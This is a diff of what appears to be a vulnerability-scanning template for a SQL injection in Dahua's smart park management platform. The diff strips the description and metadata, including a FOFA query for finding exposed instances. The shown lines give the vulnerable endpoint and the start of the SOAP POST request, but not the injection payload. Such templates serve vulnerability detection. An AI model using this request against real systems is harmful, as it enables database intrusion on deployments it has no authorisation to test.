@@ -3,12 +3,8 @@ info:
   name: 大华智慧园区综合管理平台getNewStaypointDetailQuery SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vaf3a2cg4602zpfs'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vaf3a2cg4602zpfs
-    fofa: app="dahua-智慧园区综合管理平台"
 http:
 - raw:
   - 'POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: text/xml;charset=UTF-8
-
-
 
 
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
